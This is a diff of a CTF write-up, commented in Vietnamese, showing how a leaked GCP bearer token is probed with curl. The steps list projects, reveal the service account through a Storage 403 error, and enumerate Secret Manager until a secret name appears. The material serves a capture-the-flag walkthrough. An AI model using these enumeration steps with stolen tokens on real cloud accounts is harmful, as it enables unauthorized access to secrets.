@@ -221,10 +221,20 @@ A="Authorization: Bearer ya29.c.c0AZ4bNp..."
 curl -s -H "$A" https://cloudresourcemanager.googleapis.com/v1/projects
 # -> project number: 613713115850
 
-# 2) Lỗi GCS cũng lộ service account đang dùng:
-#    meteorologist@css-ctf-2026.iam.gserviceaccount.com
+# 2) Thử GCS (Storage) để xem token có quyền gì — không có quyền,
+#    nhưng message lỗi lại tự "khai" luôn service account đang dùng:
+curl -s -H "$A" "https://storage.googleapis.com/storage/v1/b?project=613713115850"
+# -> 403: "meteorologist@css-ctf-2026.iam.gserviceaccount.com does not have
+#    storage.buckets.list access to the Google Cloud project."
 
-# 3) Liệt kê secret trong Secret Manager
+# Resource Manager bị disable, GCS thì thiếu quyền -> ta không biết chắc
+# token này đụng được gì. Cách hợp lý là đi theo checklist enumerate các
+# API phổ biến của GCP mà một service account dạng này hay được gán quyền
+# (Compute, Storage, Secret Manager, Pub/Sub, ...) cho tới khi tìm ra API
+# nào "ăn". Context của bài (gợi ý "cloud", backend tự host credential)
+# khiến Secret Manager là ứng viên đáng thử sớm.
+
+# 3) Liệt kê secret trong Secret Manager -> trúng
 curl -s -H "$A" \
   https://secretmanager.googleapis.com/v1/projects/613713115850/secrets
 # -> goog_encryption_secret
